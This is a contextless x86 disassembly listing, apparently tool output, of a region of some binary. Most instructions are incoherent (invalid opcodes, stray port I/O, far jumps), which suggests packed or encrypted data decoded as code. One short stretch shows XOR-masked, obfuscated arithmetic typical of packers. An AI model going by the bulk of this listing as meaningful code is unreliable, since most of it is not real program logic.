  413310:	or     esp,DWORD PTR [esi-0xb916018]
  413316:	dec    esp
  413317:	add    ebx,ebp
  413319:	lds    edx,FWORD PTR ds:0x771c6dea
  41331f:	imul   esi,DWORD PTR [ebx-0x4f],0x22
  413323:	add    ch,BYTE PTR [edx+0x37]
  413326:	add    esp,0xffffff9e
  413329:	mov    dh,0x5f
  41332b:	stc    
  41332c:	and    eax,DWORD PTR [esi]
  41332e:	aas    
  41332f:	jns    0x413357
  413331:	or     DWORD PTR [ebx-0x5003af4],edx
  413337:	dec    esi
  413338:	adc    edi,edi
  41333a:	dec    esi
  41333b:	pop    ss
  41333c:	jb     0x413323
  41333e:	in     eax,dx
  41333f:	arpl   WORD PTR cs:[ecx-0x1],bx
  413343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413344:	ins    DWORD PTR es:[edi],dx
  413345:	dec    ebx
  413346:	sub    esp,ebp
  413348:	mov    bh,0xe6
  41334a:	mov    ebp,?
  41334c:	lods   al,BYTE PTR ds:[esi]
  41334d:	dec    edx
  41334e:	mov    BYTE PTR [ecx-0x46],cl
  413351:	push   0x1
  413353:	push   eax
  413354:	pop    es
  413355:	cli    
  413356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413357:	inc    ebx
  413358:	sbb    ch,BYTE PTR [edi-0x62]
  41335b:	fisub  WORD PTR [esi]
  41335d:	jbe    0x4133d2
  41335f:	mov    esi,0x82190023
  413364:	js     0x4132f7
  413366:	fwait
  413367:	out    0xd3,al
  413369:	add    cl,dl
  41336b:	jno    0x41336f
  41336d:	js     0x4133a5
  41336f:	or     eax,0x516cab9f
  413374:	jnp    0x4133e0
  413376:	add    eax,0xe5162c5b
  41337b:	cmp    dl,bh
  41337d:	xchg   edi,eax
  41337e:	adc    eax,0x52ad6dd9
  413383:	sbb    BYTE PTR [ecx-0x40a5517],0x3e
  41338a:	dec    ecx
  41338b:	mov    edi,0xbeda39fb
  413390:	icebp  
  413391:	aaa    
  413392:	pop    esp
  413393:	sbb    al,0xb0
  413395:	sti    
  413396:	pop    es
  413397:	mov    eax,ds:0x1f77e512
  41339c:	mov    eax,?
  41339e:	test   DWORD PTR [ecx+0x69f7d39b],ecx
  4133a4:	push   eax
  4133a5:	js     0x4133c1
  4133a7:	hlt    
  4133a8:	inc    ebp
  4133a9:	jno    0x413406
  4133ab:	cmp    al,0xb7
  4133ad:	ja     0x413399
  4133af:	daa    
  4133b0:	inc    DWORD PTR [ebx]
  4133b2:	and    DWORD PTR [ecx+ebx*4+0xd],edi
  4133b6:	jmp    DWORD PTR [esi-0x2f]
  4133b9:	or     dh,al
  4133bb:	dec    eax
  4133bc:	and    BYTE PTR [ecx+0x62139d6],ch
  4133c2:	jo     0x413412
  4133c4:	mov    eax,ds:0xaa2f62c3
  4133c9:	popa   
  4133ca:	out    0xb9,eax
  4133cc:	cld    
  4133cd:	or     DWORD PTR [ecx],esp
  4133cf:	push   cs
  4133d0:	add    DWORD PTR [edi+0x2b6f1739],eax
  4133d6:	xchg   ebx,eax
  4133d7:	sbb    cl,BYTE PTR [edi-0x28]
  4133da:	not    DWORD PTR [edx+0xece73d0]
  4133e0:	sbb    eax,0x72530614
  4133e5:	or     DWORD PTR [eax],esp
  4133e7:	xor    al,cl
  4133e9:	dec    ebx
  4133ea:	adc    ebx,DWORD PTR [esp+eiz*2-0x7d]
  4133ee:	dec    esp
  4133ef:	lods   eax,DWORD PTR ds:[esi]
  4133f0:	rcl    eax,0xfa
  4133f3:	stos   BYTE PTR es:[edi],al
  4133f4:	or     eax,0x1052216d
  4133f9:	mov    BYTE PTR [ebp-0x2],bl
  4133fc:	scas   eax,DWORD PTR es:[edi]
  4133fd:	sbb    al,0x50
  4133ff:	ret    0x27ff
  413402:	push   cs
  413403:	pop    ss
  413404:	cmp    DWORD PTR [edx+esi*2],ecx
  413407:	into   
  413408:	or     esp,ecx
  41340a:	jmp    0xa37a:0x55a9e95a
  413411:	mov    esp,0x7d052ff
  413416:	push   esi
  413417:	popf   
  413418:	xchg   ebx,eax
  413419:	mov    dl,0xfa
  41341b:	dec    ebp
  41341c:	addr16 mov esi,0xcd5214f3
  413422:	stos   BYTE PTR es:[edi],al
  413423:	or     DWORD PTR [ebx+0x3c],ebp
  413426:	sub    BYTE PTR [ebx-0x4f22f3d6],al
  41342c:	pop    eax
  41342d:	add    esi,DWORD PTR [ecx-0x30]
  413430:	dec    ebx
  413431:	jl     0x4133f7
  413433:	add    BYTE PTR [edx+0x1e353fe],bl
  413439:	sub    ebp,DWORD PTR [edx+0x51]
  41343c:	mov    ebx,0x914b1c4c
  413441:	jae    0x4133f2
  413443:	pop    edx
  413444:	ins    BYTE PTR es:[edi],dx
  413445:	leave  
  413446:	sub    ah,BYTE PTR [esi+0x6]
  413449:	sbb    eax,0x95583474
  41344e:	in     eax,dx
  41344f:	mov    ds:0x8f3d2f4,eax
  413454:	inc    esp
  413455:	pop    ds
  413456:	or     BYTE PTR [eax],ah
  413458:	(bad)  
  413459:	sub    eax,0xdd12d11
  41345e:	in     eax,0x40
  413460:	inc    esi
  413461:	inc    esi
  413462:	jle    0x4134c4
  413464:	or     DWORD PTR [ebp-0x75f76581],0x72e146c7
  41346e:	cdq    
  41346f:	pop    esi
  413470:	xor    al,0x1c
  413472:	repnz inc edx
  413474:	sbb    BYTE PTR [edi],al
  413476:	adc    al,0x0
  413478:	mov    edi,0xd6b55cab
  41347d:	addr16 mov esi,0xcc34e12
  413483:	cwde   
  413484:	ds addr16 adc ch,ah
  413488:	into   
  413489:	aad    0xa1
  41348b:	std    
  41348c:	sub    eax,0xdf0c6e8c
  413491:	in     eax,0xac
  413493:	(bad)  
  413495:	cmp    ebp,DWORD PTR [edi-0x15]
  413498:	pusha  
  413499:	mov    ch,0x2b
  41349b:	or     eax,0x124f4e4
  4134a0:	ret    
  4134a1:	xchg   ebx,eax
  4134a2:	jecxz  0x4134be
  4134a4:	jge    0x41348e
  4134a6:	mov    al,0x82
  4134a8:	scas   eax,DWORD PTR es:[edi]
  4134a9:	sbb    al,BYTE PTR [eax+edx*2-0x74]
  4134ad:	lea    esp,[edx]
  4134af:	pop    ecx
  4134b0:	or     cl,bl
  4134b2:	mov    DWORD PTR [bp+si],eax
  4134b5:	xor    esp,DWORD PTR [esi]
  4134b7:	adc    eax,0xd7dc5d9
  4134bc:	ret    
  4134bd:	cmp    al,bl
  4134bf:	test   BYTE PTR [ecx],cl
  4134c1:	stos   DWORD PTR es:[edi],eax
  4134c2:	outs   dx,BYTE PTR ds:[esi]
  4134c3:	out    0x69,eax
  4134c5:	or     al,0xc2
  4134c7:	or     cl,BYTE PTR [ecx]
  4134c9:	cli    
  4134ca:	ror    BYTE PTR [esi+0x4a],cl
  4134cd:	push   eax
  4134ce:	mov    ecx,0xe8e5d4ec
  4134d3:	sub    ecx,ebx
  4134d5:	xchg   esp,eax
  4134d6:	in     al,0x4d
  4134d8:	push   edx
  4134d9:	sub    BYTE PTR [edi+0x1],bh
  4134dc:	push   0xffffffc6
  4134de:	add    eax,DWORD PTR [ebx-0x7ec4f0de]
  4134e4:	mov    ebx,0x5e6cb24d
  4134e9:	or     BYTE PTR [esi-0x3f],cl
  4134ec:	clc    
  4134ed:	fwait
  4134ee:	mov    BYTE PTR [ecx],ah
  4134f0:	mov    ds:0xf5f95339,eax
  4134f5:	not    BYTE PTR [edi-0x8]
  4134f8:	inc    esi
  4134f9:	mul    DWORD PTR [edx+esi*8]
  4134fc:	dec    ebx
  4134fd:	pop    eax
  4134fe:	xor    al,0x5f
  413500:	and    bh,BYTE PTR fs:[ebx]
  413503:	lods   al,BYTE PTR ds:[esi]
  413504:	add    dl,BYTE PTR [ebx+0x7c9149e5]
  41350a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41350b:	out    0xf5,al
  41350d:	loopne 0x41356c
  41350f:	pop    edi
  413510:	out    dx,al
  413511:	addr16 pop es
  413513:	ss cli 
  413515:	clc    
  413516:	xor    BYTE PTR [ebx],dh
  413518:	add    eax,0x13fcc503
  41351d:	arpl   WORD PTR [eax-0x5e56eba8],sp
  413523:	sbb    esi,DWORD PTR [edi+0x3f8686e]
  413529:	cdq    
  41352a:	adc    al,0x6d
  41352c:	mov    edi,0x42eaccd8
  413531:	push   ecx
  413532:	test   al,0xe4
  413534:	cmp    BYTE PTR ds:0x989e9884,0x64
  41353b:	fs jp  0x41358e
  41353e:	in     eax,0xcd
  413540:	jg     0x413597
  413542:	psraw  mm2,QWORD PTR [ebx]
  413545:	in     al,dx
  413546:	inc    esi
  413547:	ss cli 
  413549:	fisubr WORD PTR [eax-0x21]
  41354c:	mov    edi,0xf5dd01a
  413551:	dec    esp
  413552:	xchg   ecx,eax
  413553:	shl    BYTE PTR [ecx+0x1d],cl
  413556:	je     0x41355d
  413558:	int3   
  413559:	sub    bh,BYTE PTR [ebp-0x5ae4cb8e]
  41355f:	jns    0x413522
  413561:	mov    esi,0x14d41255
  413566:	adc    DWORD PTR [ebx],ebx
  413568:	fs ins BYTE PTR es:[edi],dx
  41356a:	stos   DWORD PTR es:[edi],eax
  41356b:	je     0x413574
  41356d:	ins    DWORD PTR es:[edi],dx
  41356e:	scas   eax,DWORD PTR es:[edi]
  41356f:	sbb    BYTE PTR [ecx+0x60],bh
  413572:	les    ebp,FWORD PTR [ebp+0x6e]
  413575:	bt     DWORD PTR [ecx+ebp*1],ebx
  413579:	out    0x7f,al
  41357b:	retf   
  41357c:	sbb    ebx,DWORD PTR [ecx+0x735d04a0]
  413582:	push   0x2f3c8d37
  413587:	ins    BYTE PTR es:[edi],dx
  413588:	push   esi
  413589:	mov    ebp,0xea050582
  41358e:	out    dx,al
  41358f:	shr    BYTE PTR [edx],cl
  413591:	pop    edi
  413592:	mov    WORD PTR [ecx],?
  413594:	mov    dl,0x7c
  413596:	mov    bh,0x40
  413598:	test   eax,0xa658796c
  41359d:	mov    eax,DWORD PTR [ecx+eax*8+0x70d4ae57]
  4135a4:	(bad)  
  4135a5:	aam    0xca
  4135a7:	lea    ecx,[esi+0x6a]
  4135aa:	mov    al,ds:0x4f431a48
  4135af:	ins    DWORD PTR es:[edi],dx
  4135b0:	and    edi,eax
  4135b2:	clc    
  4135b3:	add    al,0x9e
  4135b6:	shl    ch,1
  4135b8:	adc    cl,BYTE PTR [edx+ecx*1]
  4135bb:	mov    eax,0x674c9515
  4135c0:	adc    DWORD PTR [ecx],esi
  4135c2:	jae    0x413577
  4135c4:	jae    0x413633
  4135c6:	mov    WORD PTR [ecx-0x5262b82a],ds
  4135cc:	int    0x95
  4135ce:	mov    ds:0x81aa5ce6,al
  4135d3:	imul   ebx,DWORD PTR [ecx-0x13],0x8a51523f
  4135da:	push   gs
  4135dc:	sti    
  4135dd:	lea    eax,[ebp+0x4649dd30]
  4135e3:	mov    dl,0xc5
  4135e5:	mov    ecx,?
  4135e7:	aad    0xcb
  4135e9:	xchg   ecx,eax
  4135ea:	bound  ebp,QWORD PTR [ecx+0x2e95bbf7]
  4135f0:	jnp    0x413632
  4135f2:	popf   
  4135f3:	lahf   
  4135f4:	xchg   edi,eax
  4135f5:	or     al,0xc
  4135f7:	outs   dx,BYTE PTR ds:[esi]
  4135f8:	or     edx,esi
  4135fa:	scas   eax,DWORD PTR es:[edi]
  4135fb:	inc    ebp
  4135fc:	jno    0x41364e
  4135fe:	inc    edi
  4135ff:	pop    edx
  413600:	xor    eax,0x5845efdd
  413605:	cmp    bh,BYTE PTR [edi-0x7222d72b]
  41360b:	jmp    0x1b4c:0xa5275733
  413612:	not    BYTE PTR [ebx-0x55]
  413615:	mov    esp,DWORD PTR [edi]
  413617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413618:	aas    
  413619:	mov    ebx,0xcf70a051
  41361e:	jmp    0x413664
  413620:	les    esp,FWORD PTR [ebx]
  413622:	jl     0x413679
  413624:	or     DWORD PTR [ecx-0x46],0xffffffd9
  413628:	or     al,BYTE PTR [ebx+eiz*4+0x3f2bc3ac]
  41362f:	jns    0x4135df
  413631:	xchg   edi,eax
  413632:	and    bh,cl
  413634:	mov    esp,0x602cd373
  413639:	in     al,0xe7
  41363b:	popa   
  41363c:	xchg   edx,eax
  41363d:	aam    0x5f
  41363f:	in     al,dx
  413640:	sti    
  413641:	cmc    
  413642:	or     ah,BYTE PTR [ebx+eiz*4+0x48]
  413646:	out    0xcd,al
  413648:	icebp  
  413649:	test   DWORD PTR [ebx],edi
  41364b:	sbb    al,0x94
  41364d:	ins    BYTE PTR es:[edi],dx
  41364e:	imul   eax,ecx,0xa96366b4
  413654:	and    BYTE PTR [edx],cl
  413656:	xchg   DWORD PTR [eax+0x51f9e521],esi
  41365c:	dec    esi
  41365d:	sbb    ah,al
  41365f:	mov    eax,ds:0x3bfb955a
  413664:	jbe    0x413689
  413666:	lahf   
  413667:	ja     0x41365a
  413669:	ficom  WORD PTR [ebp-0x51e49019]
  41366f:	xchg   ebp,eax
  413670:	rol    BYTE PTR [edx+0x2eb5262e],1
  413676:	fcmovu st,st(4)
  413678:	into   
  413679:	and    eax,eax
  41367b:	xchg   esp,eax
  41367c:	les    ecx,FWORD PTR [edi+0x2f30cd8f]
  413682:	inc    ebx
  413683:	cmp    BYTE PTR [ecx+0x52],al
  413686:	add    ecx,DWORD PTR [esi-0x1b]
  413689:	dec    esp
  41368a:	ror    bh,0x96
  41368d:	sbb    edi,eax
  41368f:	push   ebx
  413690:	loop   0x41365d
  413692:	mov    dh,al
  413694:	sahf   
  413695:	shr    DWORD PTR ds:0x3dc89006,cl
  41369b:	mov    edx,0xb9fe065f
  4136a0:	fnstsw WORD PTR [ebx]
  4136a2:	pop    edx
  4136a3:	imul   eax,DWORD PTR [edx],0xffffffa2
  4136a6:	mov    eax,0xb97c9200
  4136ab:	call   0x2b42:0x9ede5342
  4136b2:	dec    ebp
  4136b3:	adc    ch,ch
  4136b5:	dec    esp
  4136b6:	(bad)  
  4136b7:	jmp    0xcaaa:0x5e5be056
  4136be:	inc    esi
  4136bf:	jecxz  0x41364c
  4136c1:	pop    ebp
  4136c2:	hlt    
  4136c3:	xor    edx,esi
  4136c5:	add    edx,edi
  4136c7:	imul   edx,ebx
  4136ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4136cd:	mov    BYTE PTR [edx+ebx*1],al
  4136d0:	mov    eax,DWORD PTR [ebp-0x30]
  4136d3:	mov    edx,DWORD PTR [ebp-0x3c]
  4136d6:	xor    eax,esi
  4136d8:	xor    edx,esi
  4136da:	add    eax,edi
  4136dc:	add    edx,edi
  4136de:	imul   eax,edx
  4136e1:	add    eax,DWORD PTR [ebp-0xc]
  4136e4:	mov    DWORD PTR [ebp-0xc],eax
  4136e7:	mov    eax,DWORD PTR [ebp-0xc]
  4136ea:	mov    edx,DWORD PTR [ebp-0x24]
  4136ed:	cmp    edx,eax
  4136ef:	jb     0x411257
  4136f5:	mov    eax,DWORD PTR [ebp-0x3c]
  4136f8:	mov    edx,DWORD PTR [ebp-0x24]
  4136fb:	xor    eax,esi
  4136fd:	add    eax,edi
  4136ff:	imul   eax,edx
  413702:	mov    edx,DWORD PTR [ebp-0x20]
  413705:	xor    edx,esi
  413707:	add    edx,edi
  413709:	or     eax,edx
  41370b:	mov    edx,DWORD PTR [ebp-0x18]
  41370e:	xor    edx,esi
  413710:	add    eax,edx
  413712:	mov    edx,DWORD PTR [ebp-0x18]
  413715:	xor    edx,esi
  413717:	add    eax,edx
  413719:	mov    edx,DWORD PTR [ebp-0x10]
  41371c:	lea    eax,[eax+edx*1+0x64e5b6]
  413723:	jmp    0x413737
  413728:	mov    eax,DWORD PTR [ebp-0x18]
  41372b:	mov    edx,DWORD PTR [ebp-0x10]
  41372e:	xor    eax,esi
  413730:	lea    eax,[eax+edx*1+0x3272db]
  413737:	mov    DWORD PTR [ebp-0x10],eax
  41373a:	jmp    0x4111a4
  41373f:	mov    eax,DWORD PTR [ebp-0x38]
  413742:	mov    edx,DWORD PTR [ebp+0xc]
  413745:	xor    edx,esi
  413747:	lea    ecx,[ecx+edx*1+0x3272db]
  41374e:	lea    edx,[ecx-0x3272db]
  413754:	xor    edx,esi
  413756:	cmp    edx,0xf89c95b6
  41375c:	jne    0x410fde
  413762:	mov    ecx,DWORD PTR [ebp+0x8]
  413765:	mov    edx,DWORD PTR [ebp+0xc]
  413768:	mov    ebx,DWORD PTR [ebp+0x8]
  41376b:	xor    edx,esi
  41376d:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  413774:	xor    ecx,esi
  413776:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41377d:	xor    ebx,esi
  41377f:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  413786:	jmp    0x415b38
  41378b:	xlat   BYTE PTR ds:[ebx]
  41378c:	repz mov bh,0xb2
  41378f:	xchg   ebx,eax
  413790:	mov    fs,WORD PTR [edi+0xef9e63]
  413796:	mov    bl,0xc1
  413798:	mov    ecx,0x6ba2eb3b
  41379d:	bound  esp,QWORD PTR [edx-0x33]
  4137a0:	pop    edi
  4137a1:	bound  esp,QWORD PTR [edx-0x9]
  4137a4:	xor    DWORD PTR [edi],edx
  4137a6:	ret    
  4137a7:	push   ds
  4137a8:	stos   DWORD PTR es:[edi],eax
  4137a9:	push   ebp
  4137aa:	icebp  
  4137ab:	jne    0x413785
  4137ad:	or     bh,bl
  4137af:	push   esi
  4137b0:	test   al,0x50
  4137b2:	xchg   edx,eax
  4137b3:	hlt    
  4137b4:	(bad)  
  4137b5:	mov    esp,0x6d7f7305
  4137ba:	aam    0xc8
  4137bc:	cmp    DWORD PTR [eax],esp
  4137be:	std    
  4137bf:	mov    al,0xbc
  4137c1:	retf   
  4137c2:	cwde   
  4137c3:	inc    ebp
  4137c4:	xchg   dh,dl
  4137c6:	xor    DWORD PTR [edx],0x69
  4137c9:	rcl    esi,cl
  4137cb:	cld    
  4137cc:	xchg   ebp,eax
  4137cd:	mov    esi,0x7cf09a5
  4137d2:	xchg   esi,eax
  4137d3:	inc    esi
  4137d4:	inc    edi
  4137d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137d6:	dec    ecx
  4137d7:	add    DWORD PTR [ebx+ebx*2+0x28],ebp
  4137db:	mov    eax,ds:0x3a5f5827
  4137e0:	rol    BYTE PTR [eax-0x7972bb30],cl
  4137e6:	adc    cl,bl
  4137e8:	pop    esp
  4137e9:	test   al,0x9a
  4137eb:	scas   eax,DWORD PTR es:[edi]
  4137ec:	aad    0xc8
  4137ee:	mov    dh,0x4b
  4137f0:	daa    
  4137f1:	push   ds
  4137f2:	cmp    DWORD PTR [ecx-0x20b29eac],edx
  4137f8:	or     al,0x73
  4137fa:	aas    
  4137fb:	pop    edx
  4137fc:	lea    edi,ds:0x135a63b5
  413802:	(bad)  
  413803:	pop    ss
  413804:	icebp  
  413805:	xor    DWORD PTR [ebp+0x6ab7ec37],0xa02f04af
  41380f:	xor    eax,0xc8ccf8de
  413814:	ja     0x413831
  413816:	cmp    esi,DWORD PTR [edx]
  413818:	rol    DWORD PTR [ebx-0x7d4780b3],0xe6
  41381f:	adc    bh,BYTE PTR [esp+ebp*4+0x4648ed6f]
  413826:	pop    ds
  413827:	in     eax,dx
  413828:	push   es
  413829:	ret    0x5d75
  41382c:	(bad)  
  41382e:	iret   
  41382f:	cwde   
  413830:	dec    ecx
  413831:	fs ret 0xae3a
  413835:	repnz sar DWORD PTR [ecx-0x2a],1
  413839:	sbb    al,0x2e
  41383b:	push   esi
  41383c:	adc    ebp,esi
  41383e:	mov    al,0x26
  413840:	adc    eax,0x19014bf6
  413845:	ret    
  413846:	mov    ebx,0xe4c722d3
  41384b:	mov    cl,0x8
  41384d:	fist   DWORD PTR [eax+eax*1+0x35]
  413851:	rdrand esp
  413854:	xor    edi,ecx
  413856:	push   ebx
  413857:	and    bh,cl
  413859:	xor    ch,bl
  41385b:	jnp    0x4137ea
  41385d:	pushf  
  41385e:	loop   0x41383a
  413860:	sahf   
  413861:	out    dx,eax
  413862:	pusha  
  413863:	inc    DWORD PTR [ebx+0x62c8791f]
  413869:	xor    edi,ecx
  41386b:	xchg   esi,eax
  41386c:	(bad)  
  41386e:	sub    esi,edi
  413870:	push   ss
  413871:	add    ebx,DWORD PTR [ebp+0x6c]
  413874:	pop    ecx
  413875:	xchg   edi,eax
  413876:	push   esi
  413877:	dec    eax
  413878:	mov    cl,0x34
  41387a:	loop   0x4138ad
  41387c:	pop    edx
  41387d:	sti    
  41387e:	or     eax,0x84229061
  413883:	mov    dl,0xf
  413885:	neg    BYTE PTR [ecx]
  413887:	hlt    
  413888:	pop    esp
  413889:	inc    ecx
  41388a:	mov    eax,0x1b386792
  41388f:	test   BYTE PTR [ebp+0x58],al
  413892:	mov    al,BYTE PTR [eax-0x35]
  413895:	add    eax,0x4ff90af9
  41389a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41389b:	dec    esp
  41389c:	xchg   ebp,eax
  41389d:	lods   al,BYTE PTR ds:[esi]
  41389e:	icebp  
  41389f:	imul   esi,ebx,0xffffffb7
  4138a2:	sub    eax,0x339093b0
  4138a7:	push   ds
  4138a8:	cdq    
  4138a9:	pop    esp
  4138aa:	mov    BYTE PTR [edi+ebx*2-0x39],dh
  4138ae:	fld    st(5)
  4138b0:	out    0xec,eax
  4138b2:	ss push esi
  4138b4:	cmp    BYTE PTR [ecx-0x5d231248],cl
  4138ba:	xchg   ebp,eax
  4138bb:	and    DWORD PTR [ecx-0x5e],0x22e43336
  4138c2:	neg    BYTE PTR [esi+0x160fdc]
  4138c8:	mov    dh,0x1f
  4138ca:	or     esp,edi
  4138cc:	inc    ebp
  4138cd:	pop    es
  4138ce:	out    dx,al
  4138cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138d0:	fild   QWORD PTR [edx]
  4138d2:	sub    BYTE PTR [edi-0x208a8c06],bl
  4138d8:	jl     0x413912
  4138da:	ret    0x1335
  4138dd:	fidiv  WORD PTR [eax-0x421b3df2]
  4138e3:	dec    eax
  4138e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138e5:	(bad)  
  4138e6:	int    0xe7
  4138e8:	sbb    DWORD PTR [ebx-0x26],esi
  4138eb:	push   ebx
  4138ec:	in     al,dx
  4138ed:	push   ss
  4138ee:	(bad)  
  4138ef:	sti    
  4138f0:	call   0x7228:0x1eed0a4a
  4138f7:	sub    DWORD PTR [ebp+edi*4+0x2d],esi
  4138fb:	xchg   BYTE PTR [esi-0x12158260],dh
  413901:	outs   dx,BYTE PTR ds:[esi]
  413902:	sub    ch,BYTE PTR [edx+0x5b]
  413905:	hlt    
  413906:	xor    dh,BYTE PTR [ebx-0x2b]
  413909:	jae    0x41396e
  41390b:	add    ebp,0x76
  41390e:	and    al,BYTE PTR ds:[ecx+eiz*1-0x77c584d6]
  413916:	mov    al,ds:0x38bb7a6d
  41391b:	mov    ebp,0x76a54ed5
  413920:	popa   
  413921:	fsubr  st(5),st
  413923:	push   eax
  413924:	dec    esp
  413925:	bound  eax,QWORD PTR [ebx+0x1c]
  413928:	mov    ds:0xbf2097a,al
  41392d:	mov    esi,0x1c53f85b
  413932:	adc    edx,DWORD PTR [edx+0x60951ad3]
  413938:	and    eax,esi
  41393a:	pushf  
  41393b:	mov    cl,0x9b
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	(bad)  
  41393f:	pop    es
  413940:	mov    ebx,0x46d3e3d3
  413945:	mov    eax,0x34643ff1
  41394a:	lea    eax,ss:[eax+edi*1+0x56dec3cc]
  413952:	fimul  WORD PTR [esi+0x1a]
  413955:	dec    ecx
  413956:	fild   QWORD PTR [edx]
  413958:	add    ecx,DWORD PTR [ecx-0x1ee62b14]
  41395e:	icebp  
  41395f:	jns    0x4139d6
  413961:	add    cl,0xee
  413964:	pop    ebp
  413965:	cmc    
  413966:	adc    bl,BYTE PTR [ebp-0x63]
  413969:	cs sbb eax,ecx
  41396c:	and    edx,edx
  41396e:	mov    ebp,0xdd2a5bd2
  413973:	test   BYTE PTR [edi+0x193c6a2b],dl
  413979:	mov    ecx,0x458bf952
  41397e:	int    0xe3
  413980:	jbe    0x4139fb
  413982:	push   cs
  413983:	clc    
  413984:	fdiv   DWORD PTR [esi]
  413986:	pop    edx
  413987:	adc    eax,0xa0492e6e
  41398c:	and    eax,0x985ade3c
  413991:	sbb    eax,0x607ec361
  413996:	jne    0x41395d
  413998:	add    ebx,DWORD PTR [esi]
  41399a:	les    esp,FWORD PTR [ebx]
  41399c:	aad    0xbd
  41399e:	lahf   
  41399f:	shl    DWORD PTR [ebx+0x708fd697],0x77
  4139a6:	jg     0x4139aa
  4139a8:	arpl   sp,bp
  4139aa:	dec    esi
  4139ab:	out    dx,al
  4139ac:	sub    DWORD PTR [esi-0x556015f6],eax
  4139b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139b3:	mul    ecx
  4139b5:	xchg   edx,eax
  4139b6:	adc    BYTE PTR ss:[ecx-0x70],bh
  4139ba:	mov    eax,ds:0xd5f435c9
  4139bf:	adc    al,0xda
  4139c1:	push   edx
  4139c2:	dec    edi
  4139c3:	or     dl,BYTE PTR [ecx+0x2bdd71f6]
  4139c9:	popf   
  4139ca:	fisubr DWORD PTR [ebp-0x7fce845a]
  4139d0:	pop    edi
  4139d1:	mov    edx,0x4720d539
  4139d6:	dec    ebp
  4139d7:	(bad)  
  4139d8:	lock sahf 
  4139da:	out    0x53,al
  4139dc:	shrd   DWORD PTR [ecx],eax,0xd
  4139e0:	int3   
  4139e1:	push   edi
  4139e2:	lods   eax,DWORD PTR ds:[esi]
  4139e3:	(bad)  
  4139e4:	mov    ss,esi
  4139e6:	cbw    
  4139e8:	mov    bl,0x58
  4139ea:	push   ecx
  4139eb:	xchg   esp,eax
  4139ec:	cmp    al,0x85
  4139ee:	xchg   edx,eax
  4139ef:	xchg   BYTE PTR [ecx+ebx*8],cl
  4139f2:	retf   
  4139f3:	(bad)  
  4139f4:	scas   eax,DWORD PTR es:[edi]
  4139f5:	xchg   esp,eax
  4139f6:	xchg   ecx,eax
  4139f7:	sub    eax,0x836fedad
  4139fc:	das    
  4139fd:	sbb    cl,BYTE PTR [edx+0x4f5b655d]
  413a03:	dec    esi
  413a04:	les    edx,FWORD PTR ds:0x3b4adf8b
  413a0a:	sbb    DWORD PTR [edi+0x745f6db4],ebp
  413a10:	sub    edx,esp
  413a12:	and    al,0x5
  413a14:	addr16 xchg ebp,eax
  413a16:	or     al,0xe9
  413a18:	jae    0x4139d4
  413a1a:	xchg   ebx,eax
  413a1b:	mov    WORD PTR [edx-0x4b78d95a],es
  413a21:	mov    esi,0xb7e8aec3
  413a26:	inc    edi
  413a27:	mov    ecx,0x7f30d091
  413a2c:	or     BYTE PTR [ecx+eax*8+0x6f31982c],bl
  413a33:	push   ecx
  413a34:	sbb    DWORD PTR [ebx-0x45],ecx
  413a37:	fimul  DWORD PTR [ecx]
  413a39:	and    eax,0x8dd510a
  413a3e:	cwde   
  413a3f:	in     al,dx
  413a40:	mov    BYTE PTR ds:0xeaf8fb1b,bh
  413a46:	fidiv  DWORD PTR [edx]
  413a48:	(bad)  
  413a49:	jo     0x413a74
  413a4b:	adc    eax,esi
  413a4d:	mov    bl,0x57
  413a4f:	jae    0x413a9b
  413a51:	ror    BYTE PTR [esi+0x33],0xcd
  413a55:	sti    
  413a56:	cmp    bh,dh
  413a58:	mov    ch,0x95
  413a5a:	xchg   edi,eax
  413a5b:	cmp    BYTE PTR ds:0xc54cf13b,dh
  413a61:	cmp    DWORD PTR [esi],esp
  413a63:	out    dx,al
  413a64:	inc    edx
  413a65:	push   esp
  413a66:	mov    ah,0xd1
  413a68:	cdq    
  413a69:	cld    
  413a6a:	scas   al,BYTE PTR es:[edi]
  413a6b:	or     ebx,DWORD PTR [ebp-0x3994a0a8]
  413a71:	xchg   edi,eax
  413a72:	cs cwde 
  413a74:	ja     0x413a8b
  413a76:	outs   dx,DWORD PTR ds:[esi]
  413a77:	rol    BYTE PTR ds:0x7ebbc5c1,cl
  413a7d:	dec    ebx
  413a7e:	or     al,0x28
  413a80:	retf   
  413a81:	or     ebx,DWORD PTR [esi-0x5d7bb478]
  413a87:	mov    dh,0xdc
  413a89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a8a:	pop    esi
  413a8b:	pop    ecx
  413a8c:	aad    0x10
  413a8e:	and    dh,dl
  413a90:	popf   
  413a91:	mov    ebx,0x9ecd7fa5
  413a96:	ds sub esi,ecx
  413a99:	call   0xc017:0xa02f6fe0
  413aa0:	sbb    DWORD PTR [ebx-0x36ed6ab8],edx
  413aa6:	ror    BYTE PTR [esi],0xf5
  413aa9:	pop    ebx
  413aaa:	shl    BYTE PTR [ecx-0x2c],0x48
  413aae:	in     al,dx
  413aaf:	lods   al,BYTE PTR ds:[esi]
  413ab0:	(bad)  [eax+0x6f049e97]
  413ab6:	hlt    
  413ab7:	rcl    DWORD PTR [ecx-0x77a440c7],cl
  413abd:	outs   dx,DWORD PTR ds:[esi]
  413abe:	popa   
  413abf:	out    0x79,eax
  413ac1:	dec    ecx
  413ac2:	inc    edx
  413ac3:	div    DWORD PTR [ecx]
  413ac5:	cmp    ch,BYTE PTR [ebx]
  413ac7:	fnstsw WORD PTR [edx-0x102cd71a]
  413acd:	sbb    dl,BYTE PTR [edi]
  413acf:	mov    ds:0x913613da,al
  413ad4:	inc    cl
  413ad6:	jg     0x413a66
  413ad8:	sub    DWORD PTR [ebx],edi
  413ada:	fwait
  413adb:	retf   0xbc1
  413ade:	adc    cl,bh
  413ae0:	jle    0x413b14
  413ae2:	ror    DWORD PTR [eax-0x1c17284b],1
